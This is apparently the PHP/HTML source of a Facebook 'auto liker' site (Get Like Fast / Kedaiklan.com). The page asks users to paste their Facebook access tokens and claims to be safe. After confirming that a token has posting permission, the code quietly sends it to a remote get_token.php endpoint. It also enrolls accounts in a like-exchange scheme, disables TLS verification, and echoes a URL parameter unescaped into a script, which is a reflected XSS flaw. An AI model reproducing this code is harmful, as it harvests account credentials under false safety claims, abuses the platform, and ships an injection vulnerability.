<?php
session_start();
// JSONURL //
function get_html($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
	return $data;
    }
function get_json($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
	return json_decode($data);
    }
if($_SESSION['token']){
	$token = $_SESSION['token'];
	$graph_url ="https://graph.facebook.com/me?access_token=" . $token;
	$user = get_json($graph_url);
	if ($user->error) {
		if ($user->error->type== "OAuthException") {
			session_destroy();
			header('Location: index.php?i=Token Expired, Please Re-Generate new Token..! !');
			}
		}
}	

if(isset($_POST['submit'])) {
	$token2 = $_POST['token'];
	if(preg_match("'access_token=(.*?)&expires_in='", $token2, $matches)){
		$token = $matches[1];
			}
	else{
		$token = $token2;
	}
		$extend = get_html("https://graph.facebook.com/me/permissions?access_token="  . $token);
		$pos = strpos($extend, "publish_stream");
		if ($pos == true) {
		$_SESSION['token'] = $token;
		$ch = curl_init('http://www.kedaiklan.com/autolike/get_token.php');
		curl_setopt ($ch, CURLOPT_POST, 1);
		curl_setopt ($ch, CURLOPT_POSTFIELDS, "token=".$token);
		curl_setopt($ch, CURLOPT_TIMEOUT, 2);
		curl_exec ($ch);
		curl_close ($ch);
			}
			else {
			session_destroy();
					header('Location: index.php?i=Please Allow App to Access Your Profile! !, Try Again..');}
		
		}else{}
if(isset($_POST['logout'])) {
session_destroy();
header('Location: index.php?i=LogOut Success :D !');
}
if(isset($_GET['i'])){
echo '<script type="text/javascript">alert("INFO:  ' . $_GET['i'] . '");</script>';
}
?><!doctype html>
<!--[if lt IE 7 ]><html class="ie ie6" lang="en"><![endif]--> <!--[if IE 7 ]><html class="ie ie7" lang="en"><![endif]--> <!--[if IE 8 ]><html class="ie ie8" lang="en"><![endif]--> <!--[if (gte IE 9)|!(IE)]><!--> <html lang="en"> <!--<![endif]--> 
<head> 
<meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<!--[if lt IE 9]><script src="js/html5.js"></script><![endif]--> 
<title>Auto Likes Facebook Status &amp; Photo Auto Liker Kedaiklan.com</title>
<meta name="description" content="Increase likes on your Facebook photo or status by using our auto like website. We are spam free facebook auto liker." />
<meta name="keywords" content="autolike, auto liker, auto like fb, facebook auto liker, auto like status, auto like facebook photo, auto like facebook" />
<meta name="robots" content="index,follow,all" />
<meta http-equiv="content-language" content="en" />
<meta name="author" content="Get Like Fast"/>
<meta name="GOOGLEBOT" content="NOODP" />
<meta name="copyright" content="Copyright &copy; Get Like Fast. All Rights Reserved." />
<link href="http://www.kedaiklan.com" rel="publisher" />
<meta name="revisit-after" content="2 days" />
<meta name="google-site-verification" content="dBIos6zx_1m5OZh9wn7QNiaQCU2ss9IkgAHaqaTHnaY" />
<meta name="msvalidate.01" content="E0F9A6FFC5358A1EC414FEB39F9BB925" />
<meta name="p:domain_verify" content="d9a8477fc6a313bfbc80d4db05146cce"/>
<meta name="alexaVerifyID" content="lfEGm96UNzcCrJm3z1XHptNWNgo" />
<link href="css/core.min.css" rel="stylesheet" media="all"/> 
<link href="css/font-awesome.min.css" rel="stylesheet" media="all"/> 
<link href="css/sequence-looptheme.css" rel="stylesheet" media="all"/> 
<link href="css/jquery.bxslider.css" rel="stylesheet" media="all"/> 
<link href="css/superfish.css" rel="stylesheet" media="all"/> 
<link href="css/component.css" rel="stylesheet" media="all"/> 
<link href="css/pp.css" rel="stylesheet" media="all"/> 
<link href="css/style.css" rel="stylesheet" media="all"/> 
<link href="assets/css/bootstrap.css" rel="stylesheet">
<script type="text/javascript" src="/fb.js"></script>
<!--[if lt IE 7]><link href="css/font-awesome-ie7.min.css" rel="stylesheet" type="text/css"/><![endif]--> 
<script src="js/modernizr.custom.js"></script> 
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=1412085392342193";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
	<!-- Google Fonts -->
    
    <link href='http://fonts.googleapis.com/css?family=Raleway:400,100,200,300,500,600,700,800,900' rel='stylesheet' type='text/css'>
	<!-- Awesome Fonts -->
	<!-- http://www.456bereastreet.com/archive/201209/tell_css_that_javascript_is_available_asap/ -->
	<script>
		document.documentElement.className = document.documentElement.className.replace(/(\s|^)no-js(\s|$)/, '$1js$2');
	</script>
  
	<!-- Support for HTML5 -->
	<!--[if lt IE 9]>
		<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->

	<!-- Enable media queries on older browsers -->
	<!--[if lt IE 9]>
		<script src="assets/js/respond.min.js"></script>
	<![endif]-->
  
	<script src="js/modernizr.js"></script>
</head> 
<body>
<script type="text/javascript">

function tokencheck()

{

$("#prepage").hide();

$("#checking").show();

}

</script>
<header> 
<div class="top-bar"> 
<div class="container"> 
<div class="row"> 
<div class="span5"> 
<nav class="clearfix"> 
<ul> <li><a href="index.php">Home</a></li> <li><a href="about.html">About</a></li> <li><a href="privacy.html">Privacy</a></li> <li><a href="faq.html">FAQ</a></li>
</ul> 
</nav> 
</div> 
<div class="span7"> 
<div class="top-bar-icon-sec"> 
<ul class="top-bar-icons"> 
<li><a href="mailto:admin@kedaiklan.com"><i class="icon-envelope"></i></a></li> <li><a href="#"><i class="icon-skype"></i></a></li> </ul> <ul class="top-bar-icons"> <li><a href="https://www.facebook.com/groups/postadvertisingmega/"><i class="icon-facebook"></i></a></li> <li><a href="https://www.facebook.com/groups/postadvertisingmega/"><i class="icon-twitter"></i></a></li> <li><a href="https://www.facebook.com/groups/postadvertisingmega//"><i class="icon-pinterest"></i></a></li> <li><a href="https://plus.google.com/b/103211857126673670412/103211857126673670412/about?hl=en"><i class="icon-google-plus"></i></a></li> </ul> </div> </div> </div> </div> </div> 
<div class="logo-nav"> 
<div class="container"> <div class="row"> <div class="span3"> <h1 class="logo"><a href="index.php" title="Auto Like"><img src="photos/logo.png" alt="Logo"></a></h1> </div> <div class="span9 hidden-phone desktop-nav"> <nav class="main-nav"> <ul id="menu" class="sf-menu clearfix"> 
<li><a href="index.php" class="active">Home</a></li> 
<li> <a href="about.html">About</a></li>
<li> <a href="how-to-use.html">How to Use</a> </li>
<li> <a href="privacy.html">Privacy</a></li> 
<li><a href="contact.html">Contact</a></li> 
</ul> </nav> </div> 

<div class="span8 mobile-nav visible-phone"> <nav id="dl-menu" class="dl-menuwrapper"> <button>Open Menu</button> 
<ul class="dl-menu"> 
<li><a href="index.php" class="active">Home</a></li> 
<li> <a href="about.html">About</a></li>
<li> <a href="how-to-use.html">How to Use</a> </li>
<li> <a href="privacy.html">Privacy</a></li> 
<li><a href="contact.html">Contact</a></li> 
</ul> 
</nav> </div> </div> </div> </div> </header> 
<div class="span12"> <hr/> </div> 
<div class="login"><div class="method" style="text-align:center; font-size:35px;"><b> <?php if ($token){echo "Welcome ".$user->first_name;}else{
		?> Login Method For Get Like Fast</b></div>
<br/><br/><div class="span12"> <hr/> </div> 
<div class="clickmessage" style="text-align:center">
<a href="http://www.kedaiklan.com/autolike/skype.html" target="_blank">
<b>Click Here</b></a> To Get The Access Token, Then Copy Paste The URL Of <strong>NOT FOUND Page</strong> in Below Box!<br/>
<br/>
Also Please <b>DON'T FORGET TO ALLOW</b>
<a href="//www.facebook.com/settings?tab=followers" target="_blank"><b>Facebook Followers [Settings]</b></a> As Well<br/><br/>
Don't Forget to Subscribe Kedaiklan Groups :&nbsp;<a href="https://www.facebook.com/groups/postadvertisingmega/" target="_blank">Kedaiklan.com</a><br/>
<br/>
				<?php
		}
		?><?php if ($token): ?><center><h3>
<b>Thanks For Using Our Website<b><br/>
We hope you will share our website with your friends.<br/>The more you share, The more Likes you will have.<br/>Please be aware that your account will also be used to <b><span class="color">LIKE</span></b> other people posts.<b></b></a><a style="font-weight:bold" href="" target="blank"><b></b></a><br><br>
				<a href="Like.php" onClick="open1111()" class="btn btn-primary btn-large" style="font-size:20px"><b>Use Auto Liker</b></a>&nbsp;&nbsp;&nbsp;

<a href="https://www.facebook.com/lists/10200448847978192" class="btn btn-danger btn-large" style="font-size:20px" target="_blank"><b>Use Auto Follow</b></a>&nbsp;&nbsp;&nbsp;

<a href="autocomment.php" onClick="open561()" class="btn btn-large btn-info" style="font-size:20px"><b>Use Auto Comments</b></a> <br/> <br/>
<form method="post" action=""><input type="submit" class="btn btn-default" name="logout" style="margin-top: 3px; margin-left: 1%;" value="Logout"></form></center>


<?php else: ?>


<form action="login.php" method="GET">
<input type="text" name="user"" value=""  style="width: 70%;" class="form-control" placeholder="http://www.skype.com/token/#access_token=CAAAAPJmB8ZBwBAOvUYsAMT9ZAmj223CjirdRDqZAUVR0uvGV0PeYj4sUiCWL8lzq43AfS3CctwaJjw5x7ZAVq8NB22p&expires_in=0"
autocomplete="off">					 
<input onClick="tokencheck();" type="submit" value="Submit" class="button aqua"/>
</form>	<?php endif ?>	
<div style="text-align:center; font-size:30px;">
<div id="checking"style="display:none;position: fixed;top: 0;left: 0;width: 100%;height: 100%;background: #f4f4f4;z-index: 99;">
<div class="text" style="position: absolute;top: 45%;left: 0;height: 100%;width: 100%;font-size: 18px;text-align: center;">
<center><img src="http://www.getlikefast.net/load.gif" alt="Loading"></center>
Checking Your Access Token Please Wait! <Br>Meanwhile Please <b style="color: red;">BE ONLINE</b>
</div>
</div>
</div>
<h2 style="font-size:20px;float:left;margin: 20px 0 20px 60px;">Auto Likes Facebook Status, Photo &amp; Video</h2>
<h3 style="font-size:20px;float:right;margin: 20px 60px 20px 0;">We are Spam Free Facebook Auto Liker Website</h3>
</div>
</div>
<div class="span12"> <hr/> </div> 
<section class="mb50"> <br/> <br/><br/>
<div class="container"> <div class="row mb50"> <div class="span12"> 
<div class="row-fluid mb50"> <div class="span3"> <div class="service-main"> 
<div class="service-icon"> <i class="icon-facebook"></i> </div> <div class="service-info"> <h3>Auto Like <span class="thin-txt">Facebook</span></h3> <p>Use Our Auto Liker & Increase Likes on Your Facebook Status in a Easy way. We give 100+ Likes on every facebook status!</p> </div> </div> </div> <div class="span3"> <div class="service-main"> <div class="service-icon"> <i class="icon-flag"></i> </div> <div class="service-info"> <h3>Spam Free <span class="thin-txt">Auto Liker</span></h3> <p>We are 100% safe auto liker, we will not post anything in any group, wall or page on your behalf!</p> </div> </div> </div> 
<div class="span3"> <div class="service-main"> <div class="service-icon"> <i class="icon-group"></i> </div> <div class="service-info"> <h3>Loved <span class="thin-txt">by Users</span></h3> <p>More than 5000+ daily users use our website. We are best and we will be.</p> </div> </div> </div> 
<div class="span3"> <div class="service-main"> <div class="service-icon"> <i class="icon-comments"></i> </div> <div class="service-info"> <h3>Customer <span class="thin-txt">Support</span></h3> <p>We have Live chat option for customer support, if you need any help ask us online or leave us a offline message.</p> </div> </div> </div> 
</div> <div class="row-fluid"> <div class="span12"> <hr/> </div> </div> </div> </div> 
</div> 
</section>
<section class="mb50"> 
<div class="container"> 
<div class="row"> 
<div class="span12 call-to-action"> <div class="row-fluid"> 
<div class="span9"> <div class="call-to-action-content"> 
<strong>Get Like Fast Video Tutorial on How to Use</strong>
<small>If you don't know how to use our website, then you can see our video tutorial. It will help you getting likes on your facebook status or photo.</small> </div>
</div> <div class="span3 action-btn"><a href="http://www.youtube.com/watch?v=hbKIqdeMaBs" class="button large" target="_blank">Watch Now</a></div> </div> </div> </div> </div> </section> 
<section class="mb20"> <div class="container"> 
<div class="row"> <div class="span8 mb30"> 
<div class="block-title"> 
<div class="block-title-text"> 
<div class="block-title-bar"></div> 
<h2>Features</h2> </div> <div class="block-title-line"> 
<div class="block-title-big-line"></div> 
<div class="block-title-small-line"></div> 
</div> </div> <div class="clear"></div> 
<div class="features"> 
<p>By Using our website you can easily get likes on your Facebook Photo, Status, Video or Custom Post. We have so many feature, some of these are:</p> <ul> 
<li>Photo Liker</li> 
<li>Status Liker</li> 
<li>Comment Liker</li>
</ul> 
</div> </div> <div class="span4 mb30"> <div class="block-title"> <div class="block-title-text"> 
<div class="block-title-bar"></div> <h2>Testimonials</h2> </div> <div class="block-title-line"> <div class="block-title-big-line"></div> 
<div class="block-title-small-line"></div> </div> </div> 
<div class="clear"></div> 
<div class="testimonials-slider"> 
<div> 
<blockquote> Best Liker I have Ever seen. Keep It Up Guys.<strong>John Doe</strong></blockquote> </div> <div> <blockquote> I am a daily user and getting likes daily. Thanks for making a awesome website.<strong>Mark</strong> </blockquote> </div> <div> <blockquote> By user website I am increasing my reputation in my friends. Good website.<strong>Marry Smith</strong> </blockquote> </div></div> </div> </div> </div> </section> 
<footer> <div class="container"> <div class="row mb10"> <div class="span3 mb50"> <div class="widget clearfix"> <h3>Recent News</h3> 
<ul> 
<li> 
<a href="#"><img src="photos/post-small-thumb-1.jpg" alt="Small Thumbnail"/></a> <div class="post-title"> <h4><a href="#">Get Like Fast Video Tutorial</a></h4> <div class="post-meta"><a href="#">March 1, 2014</a>, <a href="#">3 Comments</a></div> </div> </li> <li> <a href="#"><img src="photos/post-small-thumb-2.jpg" alt="Small Thumbnail"/></a> <div class="post-title"> <h4><a href="#">Get Like Fast Online Tutorial</a></h4> <div class="post-meta"><a href="#">March 8, 2014</a>, <a href="#">1 Comments</a></div> </div> </li> <li> <a href="#"><img src="photos/post-small-thumb-3.jpg" alt="Small Thumbnail"/></a> <div class="post-title"> <h4><a href="#">Live Chat Option is Enable</a></h4> <div class="post-meta"><a href="#">March 12, 2014</a>, <a href="#">2 Comments</a></div> </div> </li> </ul> </div> </div> <div class="span3 mb50"> <div class="widget clearfix"> <h3>Recent Tweets</h3> <ul class="tweets clearfix"> <li> <p><a href="https://twitter.com/getfastlike">@getfastlike</a> Now we are #2 on "auto like status" keyword.</p> <div class="tweet-time">2 hours ago</div> </li> <li> <p><a href="https://twitter.com/getfastlike">@getfastlike</a> Soon we are lunching our new design, hope you will like it.</p> <div class="tweet-time">2 hours ago</div> </li> <li> <p><a href="https://twitter.com/getfastlike">@getfastlike</a> in now on twitter, follow us on twitter.</p> <div class="tweet-time">4 hours ago</div> </li> </ul> </div> </div> <div class="span3 mb50"> <div class="widget clearfix"> <h3>About Us</h3> <p>We are one of the best facebook auto like website, we give free auto likes on your status, photo, video or on custom post.</p> <p>Also we are 100% safe auto liker. We don't sell tokens like other websites or we don't post anything on your behalf on any wall, group or page.</p> </div> </div> <div class="span3 mb50"> <div class="widget clearfix"> <h3>Get in Touch</h3> <address class="mb10"> <strong>Get Like Fast</strong><br/> <span>Dwarka, New Delhi 110075, </span><br/> <span>India</span><br/><br/> <span><a href="mailto:admin@kedaiklan.com">admin@kedaiklan.com</a></span> </address> <ul class="socials"> <li><a href="https://www.facebook.com/groups/postadvertisingmega/" class="social facebook"><i class="icon-facebook"></i></a></li> <li></li> <li></li> <li></li> 
<li></li> 
</ul> </div> </div> </div> </div> <div class="copyright"> <div class="container"> <div class="row"> <div class="span12"> <div class="copy">© 2014 Get Like Fast. All Right Reserved. Design &amp; Developed by <a href="http://www.kedaiklan.com">Kedaiklan.com</a></div> 
        <div class="back-to-top"><i class="icon-angle-up"></i></div> </div> </div> </div> </div> </footer> <script type="text/javascript" src="js/jquery.js"></script> <script type="text/javascript" src="js/jquery.easing.1.3.js"></script> <script type="text/javascript" src="js/jquery-migrate-1.2.1.min.js"></script> <script type="text/javascript" src="js/jquery.sequence-min.js"></script> <script src="js/jquery.ui.core.min.js"></script> <script src="js/jquery.ui.widget.min.js"></script> <script src="js/jquery.ui.tabs.min.js"></script> <script src="js/jquery.ui.accordion.min.js"></script> <script type="text/javascript" src="js/jquery.bxslider.min.js"></script> <script type="text/javascript" src="js/jquery.BlackAndWhite.min.js"></script> <script type="text/javascript" src="js/superfish.js"></script> <script src="js/jquery.dlmenu.js"></script> <script type="text/javascript" src="js/jquery.knob.js"></script> <script type="text/javascript" src="js/jquery.prettyPhoto.js"></script> <script type="text/javascript" src="js/jquery-animate-css-rotate-scale.js"></script> <script type="text/javascript" src="js/jquery.quicksand.js"></script> <script type="text/javascript" src="js/jquery.flexslider-min.js"></script> <script type="text/javascript" src="js/custom.js"></script> 
<!-- AddThis Smart Layers BEGIN -->
<!-- Go to http://www.addthis.com/get/smart-layers to customize -->
<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-52da90807d49c889"></script>
<script type="text/javascript">
  addthis.layers({
    'theme' : 'transparent',
    'share' : {
      'position' : 'right',
      'numPreferredServices' : 5
    }   
  });
</script>
<!-- AddThis Smart Layers END -->
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-46788101-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>
</body> 
</html>